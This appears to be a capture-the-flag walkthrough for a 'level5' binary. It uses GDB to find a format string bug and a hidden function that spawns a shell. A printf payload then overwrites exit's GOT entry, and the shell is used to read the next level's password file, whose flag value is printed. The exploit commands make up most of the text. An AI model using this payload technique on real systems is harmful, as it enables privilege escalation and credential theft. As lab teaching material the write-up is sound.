# 🚀 Level 5 - Walkthrough
## 🧪 First Step - Testing the Program
```bash
$ ./level5
coucou
coucou
```
- 🧾 The program waits for input and prints it back.

## 🐞 Start it in GDB
```bash
(gdb-peda)$ pdisas main
Dump of assembler code for function main:
0x0804850a <+6>:	call   0x80484c2 <n>
- 🔍 The main function calls n.

```bash
(gdb-peda)$ pdisas n
...
0x080484f3 <+49>:	call   0x8048380 <printf@plt>
...
```
- 🧩 fgets reads input into a local buffer.
- 📢 printf prints it without a format string → format string vulnerability!
- ❌ After that, exit() is called.

## 🕵️ Investigate Further - Look at All Functions
```bash
(gdb-peda)$ info functions
...
0x080484a4  o
0x080484c2  n
0x08048504  main
```
## 🧪 o() is never called. Let’s see what it does:

```bash
(gdb-peda)$ pdisas o
0x080484b1 <+13>:	call   0x80483b0 <system@plt>
```
- 🧨 It calls system("/bin/sh") and exits — this is our target!

## 🔍 Discover Buffer Position in Stack
```bash
$ python -c 'print "BBBB"+" %x"*5' | ./level5
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520
```
- 🧮 Our input BBBB is at the 4th position → %4$n

## 🎯 Plan: Overwrite GOT Entry of exit with Address of o
### Get Addresses
```bash
(gdb-peda)$ x/i 0x080483d0
0x80483d0 <exit@plt>: jmp DWORD PTR ds:0x8049838
```
- ✅ exit@plt resolves to address in GOT: 0x08049838

```bash
(gdb-peda)$ info function o
0x080484a4  o
```
- ✅ Address of o: 0x080484a4 (decimal: 134513828)

## 🛠 Build the Payload
Write the address 0x080484a4 to 0x08049838 using %n

```bash
$ python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")' | ./level5
```
## ✅ Final Step - Trigger Shell and Read Password
```bash
$ (python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")'; cat -) | ./level5
whoami
level6
cat ~level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
- 🎉 Done!

